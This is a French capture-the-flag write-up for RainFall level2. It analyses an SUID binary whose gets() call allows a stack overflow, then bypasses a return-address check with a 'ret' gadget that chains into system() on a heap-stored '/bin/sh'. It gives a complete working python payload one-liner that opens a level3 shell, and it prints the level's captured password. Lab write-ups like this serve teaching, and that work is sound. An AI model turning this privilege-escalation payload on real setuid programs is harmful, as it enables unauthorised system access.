# RainFall CTF - Level2

## Reconnaissance

### Fichier trouvé
```bash
level2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```

**Observations :**
- Exécutable avec SUID bit activé (`s` dans les permissions)
- Appartient à `level3` (propriétaire) et `users` (groupe)
- Peut être exécuté avec les privilèges de `level3`

## Analyse statique avec Ghidra

### Fonction main
```c
void main(void) {
  p();
  return;
}
```

### Fonction p (vulnérable)
```c
void p(void) {
  uint unaff_retaddr;
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}
```

### Fonction utile pour l'exploitation
```c
void __libc_csu_fini(void) {
  return;
}
```

**Code assembleur :**
```asm
__libc_csu_fini:
080485c0 f3 c3    RET
```

## Analyse des vulnérabilités

### Buffer Overflow
- **Variable vulnérable** : `local_50[76]` (tableau de 76 caractères)
- **Fonction dangereuse** : `gets()` - aucune vérification de taille
- **Impact** : Débordement possible du buffer permettant de contrôler l'adresse de retour

### Protection de sécurité
```c
if ((unaff_retaddr & 0xb0000000) == 0xb0000000)
```
- **Fonction** : Bloque toute adresse de retour commençant par `0xb0`, `0xb1`, ..., `0xbf`
- **Impact** : Empêche l'utilisation directe de :
  - La libc (adresses en `0xb7xxxxxx`)
  - La stack (adresses en `0xbfxxxxxx`)
  - Variables d'environnement

## Stratégie d'exploitation

### Contournement de la protection
Utiliser l'adresse `0x080485c0` qui :
- Ne déclenche pas la protection (commence par `0x08`)
- Contient une instruction `ret` simple
- N'altère pas la mémoire (aucune instruction avant)
- Agit comme un "trampoline" vers `system()`

### Technique ROP (Return-Oriented Programming)
1. Redirection vers le gadget ROP (`0x080485c0`)
2. Le gadget exécute `ret` et dépile `system()`
3. `system()` s'exécute avec l'argument fourni

## Récupération des adresses nécessaires

### Adresse de system()
```bash
gdb ./level2
(gdb) b main
(gdb) run
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

### Adresse heap (pour l'argument "/bin/sh")
```bash
gdb ./level2
(gdb) b strdup
(gdb) run
test
(gdb) finish
(gdb) p/x $eax
$2 = 0x804a008
```

L'adresse `0x804a008` est celle où `strdup()` copie notre buffer sur la heap.

## Construction du payload

### Structure mémoire
```
Buffer[76] + Frame_Pointer[4] + Return_Address[4] = 84 octets total
```

### Payload final
```
"/bin/sh\0" (8 octets) +
'A' * 68 (pour remplir le buffer : 8 + 68 = 76) +
'A' * 4 (pour écraser le frame pointer) +
GADGET_ROP (0x080485c0 - contourne la sécurité) +
SYSTEM (0xb7e6b060 - fonction à exécuter) +
ADRESSE_RETOUR_BIDON ("BBBB" - on s'en fiche) +
ADRESSE_HEAP (0x804a008 - argument "/bin/sh")
```

### Commande d'exploitation
```bash
(python -c "print('/bin/sh\x00' + 'A' * (68+4) + '\xc0\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'BBBB' + '\x08\xa0\x04\x08')"; cat) | ./level2
```

## Mécanisme d'exécution

1. `gets()` lit le payload dans `local_50`
2. La protection vérifie `0x080485c0` → OK (commence par `0x08`)
3. `puts()` affiche "/bin/sh"
4. `strdup()` copie le buffer vers la heap à `0x804a008`
5. `return` saute vers `0x080485c0` (gadget ROP)
6. Le gadget fait `ret` → dépile et saute vers `0xb7e6b060` (`system`)
7. `system(0x804a008)` s'exécute avec "/bin/sh" comme argument
8. Shell ouvert avec les privilèges de `level3`

## Vérification de l'exploitation

```bash
level2@RainFall:~$ (python -c "print('/bin/sh\x00' + 'A' * 72 + '\xc0\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'BBBB' + '\x08\xa0\x04\x08')"; cat) | ./level2
/bin/sh
whoami
level3
```

### Récupération du flag
```bash
cat /home/user/level3/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Notes techniques

- **Type de vulnérabilité** : Buffer Overflow avec protection anti-ret2libc
- **Technique d'exploitation** : ROP (Return-Oriented Programming) + Heap exploitation
- **Architecture** : x86 (32-bit)
- **Protection contournée** : Vérification des bits hauts de l'adresse de retour
- **Concepts utilisés** :
  - Buffer overflow pour contrôler l'exécution
  - ROP pour contourner les protections
  - Exploitation de heap via `strdup()`
  - Little-endian encoding des adresses
- **Difficulté** : Avancé - nécessite compréhension des protections modernes